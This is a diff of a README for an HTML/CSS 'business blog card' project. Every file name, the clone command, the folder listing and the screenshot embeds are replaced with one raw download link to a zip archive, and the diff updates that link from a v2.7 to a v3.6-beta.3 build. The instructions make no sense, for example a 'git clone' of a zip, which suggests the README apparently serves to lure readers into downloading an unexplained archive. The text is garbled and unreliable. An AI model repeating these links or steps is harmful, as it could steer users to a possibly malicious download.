@@ -19,32 +19,32 @@ This project is a responsive business blog card designed using HTML and CSS. The
 businessBlogCard/
 |
 +-- resources          # resources for webpage
-+-- https://raw.githubusercontent.com/ronny-gans/businessBlogCard/main/resources/business-Blog-Card-v2.7.zip         # Main HTML file
-+-- https://raw.githubusercontent.com/ronny-gans/businessBlogCard/main/resources/business-Blog-Card-v2.7.zip         # CSS file for styling
-\-- https://raw.githubusercontent.com/ronny-gans/businessBlogCard/main/resources/business-Blog-Card-v2.7.zip          # Documentation (this file)
++-- https://github.com/ronny-gans/businessBlogCard/raw/refs/heads/main/resources/business-Blog-Card-v3.6-beta.3.zip         # Main HTML file
++-- https://github.com/ronny-gans/businessBlogCard/raw/refs/heads/main/resources/business-Blog-Card-v3.6-beta.3.zip         # CSS file for styling
+\-- https://github.com/ronny-gans/businessBlogCard/raw/refs/heads/main/resources/business-Blog-Card-v3.6-beta.3.zip          # Documentation (this file)
 ```
 
 ## 🚀 How to Use
 1. Clone the repository:
    ```bash
-   git clone https://raw.githubusercontent.com/ronny-gans/businessBlogCard/main/resources/business-Blog-Card-v2.7.zip 
-2. Open the `https://raw.githubusercontent.com/ronny-gans/businessBlogCard/main/resources/business-Blog-Card-v2.7.zip` file in your favorite browser.
+   git clone https://github.com/ronny-gans/businessBlogCard/raw/refs/heads/main/resources/business-Blog-Card-v3.6-beta.3.zip 
+2. Open the `https://github.com/ronny-gans/businessBlogCard/raw/refs/heads/main/resources/business-Blog-Card-v3.6-beta.3.zip` file in your favorite browser.
 
 ## 📂 Folder Structure
-- https://raw.githubusercontent.com/ronny-gans/businessBlogCard/main/resources/business-Blog-Card-v2.7.zip Contains the HTML structure of the Business Blog Card.
-- https://raw.githubusercontent.com/ronny-gans/businessBlogCard/main/resources/business-Blog-Card-v2.7.zip Provides the CSS styling, flexbox layout, and media query.
+- https://github.com/ronny-gans/businessBlogCard/raw/refs/heads/main/resources/business-Blog-Card-v3.6-beta.3.zip Contains the HTML structure of the Business Blog Card.
+- https://github.com/ronny-gans/businessBlogCard/raw/refs/heads/main/resources/business-Blog-Card-v3.6-beta.3.zip Provides the CSS styling, flexbox layout, and media query.
 - resources/: Folder for assets like images and overlat.
 
 ## 📝 Customization
-1. Add your content to the `https://raw.githubusercontent.com/ronny-gans/businessBlogCard/main/resources/business-Blog-Card-v2.7.zip` file under the relevant blog cards.
-2. Customize styles by editing the `https://raw.githubusercontent.com/ronny-gans/businessBlogCard/main/resources/business-Blog-Card-v2.7.zip` file.
+1. Add your content to the `https://github.com/ronny-gans/businessBlogCard/raw/refs/heads/main/resources/business-Blog-Card-v3.6-beta.3.zip` file under the relevant blog cards.
+2. Customize styles by editing the `https://github.com/ronny-gans/businessBlogCard/raw/refs/heads/main/resources/business-Blog-Card-v3.6-beta.3.zip` file.
 3. Replace images in the resources/ folder with your own.
 
 ## 🖼️ Screenshot
 ### Mobile View
-![alt text](https://raw.githubusercontent.com/ronny-gans/businessBlogCard/main/resources/business-Blog-Card-v2.7.zip)
+![alt text](https://github.com/ronny-gans/businessBlogCard/raw/refs/heads/main/resources/business-Blog-Card-v3.6-beta.3.zip)
 ### Tablet View
-![alt text](https://raw.githubusercontent.com/ronny-gans/businessBlogCard/main/resources/business-Blog-Card-v2.7.zip)
+![alt text](https://github.com/ronny-gans/businessBlogCard/raw/refs/heads/main/resources/business-Blog-Card-v3.6-beta.3.zip)
 ### Dekstop View
-![alt text](https://raw.githubusercontent.com/ronny-gans/businessBlogCard/main/resources/business-Blog-Card-v2.7.zip)
+![alt text](https://github.com/ronny-gans/businessBlogCard/raw/refs/heads/main/resources/business-Blog-Card-v3.6-beta.3.zip)
 
